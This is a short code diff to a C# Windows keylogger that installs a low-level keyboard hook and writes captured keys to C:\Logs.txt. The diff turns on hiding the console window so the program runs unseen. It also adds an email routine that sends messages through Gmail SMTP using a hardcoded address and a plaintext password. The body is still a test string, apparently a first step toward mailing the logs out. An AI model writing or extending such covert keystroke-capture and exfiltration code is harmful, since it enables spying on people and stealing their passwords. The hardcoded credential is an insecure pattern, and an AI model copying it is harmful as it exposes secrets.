@@ -30,7 +30,7 @@ namespace WindowsKeyReader
         static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
-            //ShowWindow(handle, SW_HIDE); //coment uit as wil cosole sien
+            ShowWindow(handle, SW_HIDE); //coment uit as wil cosole sien
             hook = SetHook(proc);
             Application.Run();
             UnhookWindowsHookEx(hook);
@@ -50,7 +50,8 @@ namespace WindowsKeyReader
 
         public void Start()
         {
-            MessageBox.Show("Jipeee");
+            //MessageBox.Show("Jipeee");
+            email();
         }
 
         enum CtrlType
@@ -125,6 +126,34 @@ namespace WindowsKeyReader
             StreamWriter writer = new StreamWriter("C:\\Logs.txt");
             writer.WriteLine(logs);
             writer.Close();
+
+        }
+
+        public void email()
+        {
+            var fromAddress = new MailAddress("lombaardzander@gamil.com", "Zander Lombaard");
+            var toAddress = new MailAddress("lombaardzander@gmail.com", "Zander Lombaard");
+            const string fromPassword = "0815604051";
+            const string subject = "Toets";
+            const string body = "Toets";
+            
+            var smtp = new SmtpClient
+            {
+                Host = "smtp.gmail.com",
+                Port = 587,
+                EnableSsl = true,
+                DeliveryMethod = SmtpDeliveryMethod.Network,
+                UseDefaultCredentials = false,
+                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
+            };
+            using (var message = new MailMessage(fromAddress, toAddress)
+            {
+                Subject = subject,
+                Body = body
+            })
+            {
+                smtp.Send(message);
+            }
 
         }
 
